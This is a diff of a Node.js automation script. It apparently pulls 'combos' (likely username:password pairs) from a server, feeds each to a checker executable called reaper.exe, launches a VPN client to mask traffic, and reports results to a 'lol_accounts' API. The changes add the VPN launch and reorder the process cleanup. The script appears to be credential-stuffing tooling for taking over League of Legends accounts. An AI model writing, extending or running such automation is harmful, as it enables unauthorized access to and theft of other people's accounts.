@@ -32,11 +32,10 @@ const main = async () => {
       let [, combos] = response.data.split('\n\n');
       combos = (combos || response.data || '').split('\n').filter(c => c);
       console.log(`Combos:\n${combos}`);
+	  run(`"${projectDir}/src/vpn_client/hsscp.exe"`);
+	  await wait(11000);
 
-      let first = true;
       for (const combo of combos) {
-        if (!first) await run('taskkill /IM "._cache_reaper.exe" /F');
-        first = false;
         fs.writeFileSync(`${projectDir}/src/reaper/combos.txt`, combo);
         run(`cd ${projectDir}/src/reaper && reaper.exe`);
         await wait(2000);
@@ -55,7 +54,7 @@ const main = async () => {
             })
             .then(rPut => {
               console.log('Update Status', rPut.status);
-              console.log('Update Data', rPut.data);
+              console.log('Update Data', JSON.stringify(rPut.data, null, 2));
             })
             .catch(console.error);
 
@@ -66,8 +65,9 @@ const main = async () => {
             .put(`${url}/api/lol_accounts/update`, result, { headers: { admin_secret_production: secret } })
             .then(rPut => {
               console.log('Update Status', rPut.status);
-              console.log('Update Data', rPut.data);
+              console.log('Update Data', JSON.stringify(rPut.data, null, 2));
             });
+		await run('taskkill /IM "._cache_reaper.exe" /F');
       }
     })
     .catch(error => {
